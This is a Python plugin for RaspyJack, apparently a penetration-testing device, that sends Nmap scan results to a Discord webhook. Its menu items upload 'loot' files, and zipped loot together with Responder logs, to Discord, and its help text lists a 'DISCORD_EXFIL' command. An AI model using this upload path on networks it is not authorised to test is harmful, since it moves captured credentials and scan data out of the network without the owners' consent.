from __future__ import annotations
import os
import threading
from datetime import datetime
from plugins.base import Plugin
from .helpers import discord_utils
from .helpers.discord_utils import DISCORD_ATTACHMENT_LIMIT


# =============================================================================
# NOTIFICATION HELPERS
# =============================================================================

def _send_notification(plugin_instance, scan_label: str, file_path: str, target_network: str, interface: str):
    """Send Nmap scan notification to Discord using the flexible embed method."""
    try:
        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
            print(f"[DiscordNotifier] Scan file is missing or empty: {file_path}")
            return
        
        # Build embed configuration with full customization
        embed_config = {
            "title": f"🔍 Nmap Scan Complete: {scan_label}",
            "description": f"**Target Network:** `{target_network}`\n**Interface:** `{interface}`\n**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 0x00ff00,  # Green color for success
            "fields": [
                {
                    "name": "📁 Scan Results",
                    "value": f"**File:** `{os.path.basename(file_path)}`\n**Size:** {os.path.getsize(file_path):,} bytes",
                    "inline": False
                }
            ],
            "footer": {"text": "RaspyJack Nmap Scanner"},
            "timestamp": True  # Auto-generate timestamp
        }
        
        # Use the new flexible method
        success = discord_utils.send_embed_to_discord(embed_config=embed_config, files=[file_path])

        event_payload = {
            'type': 'scan_notification',
            'label': scan_label,
            'file': file_path,
            'interface': interface,
            'target_network': target_network,
            'timestamp': datetime.now().isoformat(),
            'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0
        }
        if success:
            print("[DiscordNotifier] Scan notification sent successfully.")
            try:
                plugin_instance.emit('discord.message.sent', **event_payload)
            except Exception:
                pass
        else:
            print("[DiscordNotifier] Failed to send scan notification.")
            try:
                plugin_instance.emit('discord.message.failed', **event_payload)
            except Exception:
                pass
            
    except Exception as e:
        print(f"[DiscordNotifier] Error sending notification: {e}")


# =============================================================================
# MAIN PLUGIN CLASS
# =============================================================================

class DiscordNotifierPlugin(Plugin):
    """
    Discord Notifier Plugin
    
    Provides Discord webhook integration for RaspyJack notifications.
    Features:
    - Automatic scan result notifications
    - File upload capabilities
    - Loot archive creation and upload
    - Legacy configuration migration
    """
    
    def __init__(self):
        super().__init__()
        self._ctx = None
        self._event_hook_rules = [] 
        self._event_hook_handlers = []
    
    # -------------------------------------------------------------------------
    # PLUGIN LIFECYCLE
    # -------------------------------------------------------------------------
    
    def on_load(self, ctx: dict) -> None:
        """Initialize plugin and setup Discord webhook configuration."""
        self._ctx = ctx
        
        # Setup Discord webhook (handles migration and configuration)
        self._setup_discord_webhook()
        
        # Subscribe to scan completion events
        self.on("scan.after", self._on_scan_after)
        # Load event hook rules
        self._reload_event_hooks()
    
    def on_config_changed(self, key: str, old_value, new_value) -> None:
        """React to configuration changes."""
        if key == "nmap_notifications":
            status = "enabled" if new_value else "disabled"
            print(f"[DiscordNotifier] Nmap notifications {status}")
        elif key == "webhook_url":
            # Reconfigure Discord webhook when URL changes
            if new_value and new_value.startswith("https://discord.com/api/webhooks/"):
                updated = discord_utils.configure_webhook(new_value)
                print(f"[DiscordNotifier] Webhook URL updated")
                try:
                    self.emit('discord.webhook.updated', url=new_value, updated=updated)
                except Exception:
                    pass
            else:
                print(f"[DiscordNotifier] Invalid webhook URL - Discord notifications disabled")
        elif key in ("event_hooks", "auto_messages"):
            # Expect list of rule dicts (support legacy key auto_messages)
            print("[DiscordNotifier] Reloading event hook rules")
            self._reload_event_hooks()

    # -------------------------------------------------------------------------
    # EVENT HOOK RULES
    # -------------------------------------------------------------------------

    def _reload_event_hooks(self):
        """Load and register event hook rules from configuration.

        Hook format (list item in config):
        {
          "id": "scan_summary",            # optional unique id (string)
          "event": "scan.after",           # required (supports wildcard *)
          "message": "Scan {label} done",  # plain content OR
          "embed": {                       # embed object (optional)
             "title": "Scan {label}",
             "description": "Targets: {args}",
             "color": 65280
          },
          "files": ["{result_path}"],      # optional list of file paths (placeholders)
          "enabled": true                  # optional, default true
        }
        Placeholders use python str.format with a SafeDict of event data.
        """
        # Unsubscribe previous handlers
        for pattern, handler in self._event_hook_handlers:
            try:
                self.off(handler)
            except Exception:
                pass
        self._event_hook_handlers.clear()
        self._event_hook_rules.clear()

        raw_rules = self.get_config_value("event_hooks", None)
        raw_rules = raw_rules or []
        if not isinstance(raw_rules, list):
            return

        normalized = []
        for idx, r in enumerate(raw_rules):
            if not isinstance(r, dict):
                continue
            event_pat = r.get("event") or r.get("topic")
            if not event_pat or not isinstance(event_pat, str):
                continue
            enabled = r.get("enabled", True)
            if not enabled:
                continue
            msg = r.get("message")
            embed = r.get("embed") if isinstance(r.get("embed"), dict) else None
            files = r.get("files") if isinstance(r.get("files"), list) else []
            hook_id = r.get("id") if isinstance(r.get("id"), str) else None
            rule = {
                'event': event_pat,
                'message': msg,
                'embed': embed,
                'files': files,
                'index': idx,
                'id': hook_id,
            }
            normalized.append(rule)
        self._event_hook_rules = normalized

        # Register handlers (one per unique pattern to reduce duplicates)
        patterns = {}
        for rule in normalized:
            patterns.setdefault(rule['event'], []).append(rule)

        for pattern, rules in patterns.items():
            def make_handler(rules_list):
                def _handler(event_name, data):
                    self._process_event_hooks(event_name, data or {}, rules_list)
                return _handler
            h = make_handler(rules)
            self.on(pattern, h)
            self._event_hook_handlers.append((pattern, h))
        if normalized:
            print(f"[DiscordNotifier] Loaded {len(normalized)} event hook rule(s)")

    def _process_event_hooks(self, event_name: str, data: dict, rules: list):
        if not discord_utils.is_configured():
            return
        # Provide safe formatting context
        ctx = _SafeDict(**data)
        ctx['event'] = event_name
        for rule in rules:
            try:
                files = []
                for f in rule['files']:
                    try:
                        expanded = f.format_map(ctx)
                        if os.path.exists(expanded) and os.path.getsize(expanded) > 0:
                            files.append(expanded)
                    except Exception:
                        continue
                embed_cfg = None
                if rule['embed']:
                    # Deep copy & format each string field recursively
                    embed_cfg = _format_embed(rule['embed'], ctx)
                elif rule['message']:
                    # Simple content mode
                    embed_cfg = { 'content': rule['message'].format_map(ctx) }
                if not embed_cfg:
                    continue
                ok = discord_utils.send_embed_to_discord(embed_config=embed_cfg, files=files if files else None)
                evt_payload = {
                    'type': 'event_hook',
                    'rule_index': rule['index'],
                    'hook_id': rule.get('id'),
                    'trigger_event': event_name,
                    'success': ok,
                    'files': files,
                    'timestamp': datetime.now().isoformat()
                }
                self.emit('discord.message.sent' if ok else 'discord.message.failed', **evt_payload)
            except Exception as e:
                print(f"[DiscordNotifier] Event hook rule error: {e}")

    
    # -------------------------------------------------------------------------
    # WEBHOOK CONFIGURATION
    # -------------------------------------------------------------------------
    
    def _setup_discord_webhook(self):
        """Setup Discord webhook configuration, handling migration and configuration."""
        try:
            # Check if webhook is already configured in plugin
            current_webhook = self.get_config_value("webhook_url", "")
            
            if current_webhook and current_webhook.startswith("https://discord.com/api/webhooks/"):
                # Use existing plugin configuration
                if discord_utils.configure_webhook(current_webhook):
                    print("[DiscordNotifier] Using webhook from plugin configuration")
                    try:
                        self.emit('discord.webhook.configured', url=current_webhook, source='config')
                    except Exception:
                        pass
                    return
            
            # Check for legacy file and migrate if needed
            webhook_from_file = self._configure_webhook_from_file()
            if webhook_from_file:
                # Migrate to plugin configuration
                self.set_config_value("webhook_url", webhook_from_file)
                success = self.persist_option("webhook_url", webhook_from_file)

                if success:
                    print(f"[DiscordNotifier] Successfully migrated webhook from file to plugin configuration")
                else:
                    print(f"[DiscordNotifier] Warning: Could not persist migrated webhook")
                # Configure regardless of persistence outcome
                if discord_utils.configure_webhook(webhook_from_file):
                    try:
                        self.emit('discord.webhook.configured', url=webhook_from_file, source='legacy_file', persisted=success)
                    except Exception:
                        pass
                return
            
            print("[DiscordNotifier] No webhook configured - Discord notifications disabled")
                        
        except Exception as e:
            print(f"[DiscordNotifier] Error during webhook setup: {e}")
    
    def _configure_webhook_from_file(self, config_file: str = None):
        """
        Configure Discord webhook from a file (legacy migration support).
        
        Args:
            config_file: Path to config file (defaults to standard location)
            
        Returns:
            str: Webhook URL if found, None otherwise
        """
        config_path = config_file or "/root/Raspyjack/discord_webhook.txt"
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    for line in f:
                        if '#' in line or not line.strip():
                            continue
                        
                        webhook = line.strip()
                        if webhook.startswith("https://discord.com/api/webhooks/"):
                            return webhook
            except Exception as e:
                print(f"[DiscordNotifier] Error reading config file: {e}")
        
        return None
    
    # -------------------------------------------------------------------------
    # EVENT HANDLERS
    # -------------------------------------------------------------------------
    
    def _on_scan_after(self, topic: str, data: dict) -> None:
        """Handle scan completion events and send Discord notifications."""
        label = data.get('label')
        result_path = data.get('result_path')
        
        # Validate required data
        if not label or not result_path:
            return
        
        # Check if notifications are enabled
        if not self.get_config_value("nmap_notifications", True):
            return
        
        # Check if Discord is configured
        if not discord_utils.is_configured():
            return
            
        # Get network information
        try:
            from wifi.raspyjack_integration import get_best_interface, get_nmap_target_network
            interface = get_best_interface()
            target_network = get_nmap_target_network(interface)
        except Exception:
            interface = "eth0"
            target_network = "unknown"
        
        # Send notification in background thread
        thread = threading.Thread(
            target=_send_notification,
            args=(self, label, result_path, target_network, interface),
            daemon=True
        )
        thread.start()
    
    # -------------------------------------------------------------------------
    # PLUGIN INFO
    # -------------------------------------------------------------------------
    
    def get_info(self) -> str:
        """Return plugin status and configuration information."""
        webhook_url = discord_utils.get_webhook_url()
        
        if webhook_url:
            return self._get_configured_info(webhook_url)
        else:
            return self._get_unconfigured_info()
    
    def _get_configured_info(self, webhook_url: str) -> str:
        """Generate info text for configured webhook."""
        # Extract webhook ID for display (hide token for security)
        try:
            webhook_parts = webhook_url.split('/')
            webhook_id = webhook_parts[-2] if len(webhook_parts) >= 2 else "unknown"
            masked_id = f"{webhook_id[:8]}...{webhook_id[-4:]}" if len(webhook_id) > 12 else webhook_id
        except:
            masked_id = "configured"
        
        # Get current configuration value
        nmap_notifications = self.get_config_value("nmap_notifications", True)
        
        info_lines = [
            "Discord webhook configured",
            f"Webhook ID: {masked_id}",
            f"Status: {'Ready' if nmap_notifications else 'Notifications disabled'}",
            f"Event hooks: {len(getattr(self, '_event_hook_rules', []))}",
            "",
            "Current Configuration:",
            f"• Nmap notifications: {'ON' if nmap_notifications else 'OFF'}",
            "",
            "Available commands:",
            "• DISCORD_MESSAGE - Send messages", 
            "• DISCORD_EXFIL - Send files"
        ]
        return "\n".join(info_lines)
    
    def _get_unconfigured_info(self) -> str:
        """Generate info text for unconfigured webhook."""
        info_lines = [
            "Discord webhook NOT configured",
            "",
            "Setup instructions:",
            "1. Create Discord webhook in server",
            "2. Edit /root/Raspyjack/discord_webhook.txt",
            "3. Add webhook URL to file",
            "4. Restart RaspyJack",
            "",
            "Current status: No notifications will be sent"
        ]
        return "\n".join(info_lines)
    
    # -------------------------------------------------------------------------
    # MENU INTEGRATION
    # -------------------------------------------------------------------------
    
    def provide_menu_items(self):
        """Provide custom menu items for this plugin."""
        items = []
        
        # Only show menu items if Discord is configured
        if discord_utils.is_configured():
            items.append((
                "Send file to Discord", 
                self._menu_send_loot_file, 
                '\uf1d8', 
                "Upload a file to Discord"
            ))
            items.append((
                "Send loot archive", 
                self._menu_send_loot_archive, 
                '\uf187', 
                "Zip loot + logs and upload"
            ))
        
        return items
    
    def _menu_send_loot_file(self):
        """Interactive file picker limited to loot/ directory; sends selected file."""
        if not discord_utils.is_configured():
            return
        
        wctx = self._ctx.get('widget_context')
        if not wctx:
            return
        
        try:
            from ui.widgets import explorer, dialog_info
        except Exception:
            return
        
        # Resolve root install path
        defaults = self._ctx.get('defaults')
        root_path = getattr(defaults, 'install_path', '/root/Raspyjack/') if defaults else '/root/Raspyjack/'
        loot_path = os.path.join(root_path, 'loot')
        
        # Check if loot directory exists
        if not os.path.isdir(loot_path):
            dialog_info(wctx, "loot/ directory not found", wait=True, center=True)
            return
        
        # Show file picker
        file_path = explorer(wctx, loot_path, extensions='')
        if not file_path:
            return
        
        # Send selected file
        ok = discord_utils.send_file_to_discord(
            file_path,
            title=f"Loot: {os.path.basename(file_path)}"
        )
        try:
            event_payload = {
                'type': 'loot_file',
                'file': file_path,
                'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0,
                'timestamp': datetime.now().isoformat()
            }
            self.emit('discord.message.sent' if ok else 'discord.message.failed', **event_payload)
        except Exception:
            pass
        dialog_info(wctx, ("File sent" if ok else "Send failed"), wait=True, center=True)
    
    def _menu_send_loot_archive(self):
        """Build in-memory ZIP of loot/ + Responder/logs and send to Discord."""
        if not discord_utils.is_configured():
            return
        
        wctx = self._ctx.get('widget_context')
        if not wctx:
            return
        
        try:
            from ui.widgets import dialog_info, dialog_wait, dialog_wait_close
        except Exception:
            return
        
        # Resolve root install path
        defaults = self._ctx.get('defaults')
        root_path = getattr(defaults, 'install_path', '/root/Raspyjack/') if defaults else '/root/Raspyjack/'
        
        # Build archive with progress indicator
        wait_handle = dialog_wait(wctx, text="Building zip...")
        buf, fname, size = discord_utils.build_loot_archive(root_path)
        dialog_wait_close(wctx, wait_handle)
        
        # Check if archive was created successfully
        if not buf:
            dialog_info(wctx, fname[:48], wait=True, center=True)  # fname holds error message here
            return
        
        # Check size limit
        if size > DISCORD_ATTACHMENT_LIMIT:
            dialog_info(wctx, f"Archive too big\n{size/1024/1024:.1f} MB", wait=True, center=True)
            try:
                self.emit('discord.message.failed', type='loot_archive', file=fname, size=size, reason='size_limit', limit=DISCORD_ATTACHMENT_LIMIT, timestamp=datetime.now().isoformat())
            except Exception:
                pass
            return
        
        # Upload archive with progress indicator
        wait_handle = dialog_wait(wctx, text="Uploading...")
        ok = discord_utils.send_buffer_to_discord(
            buf,
            fname,
            message=f"📦 Loot archive ({size/1024:.0f} KB)"
        )
        try:
            self.emit('discord.message.sent' if ok else 'discord.message.failed', type='loot_archive', file=fname, size=size, timestamp=datetime.now().isoformat())
        except Exception:
            pass
        dialog_wait_close(wctx, wait_handle)
        
        # Show result
        dialog_info(wctx, ("Archive sent" if ok else "Upload failed"), wait=True, center=True)


# =============================================================================
# PLUGIN INSTANCE
# =============================================================================

plugin = DiscordNotifierPlugin()


# -----------------------------------------------------------------------------
# Helper utilities for safe formatting
# -----------------------------------------------------------------------------

class _SafeDict(dict):
    def __missing__(self, key):
        return '{' + key + '}'  # leave placeholder untouched if missing

def _format_embed(embed: dict, ctx: dict):
    """Recursively format an embed configuration dictionary with placeholders.

    Only string values are formatted; other types are passed through.
    """
    if not isinstance(embed, dict):
        return None
    def recurse(obj):
        if isinstance(obj, dict):
            return {k: recurse(v) for k, v in obj.items()}
        if isinstance(obj, list):
            return [recurse(v) for v in obj]
        if isinstance(obj, str):
            try:
                return obj.format_map(ctx)
            except Exception:
                return obj
        return obj
    return recurse(embed)
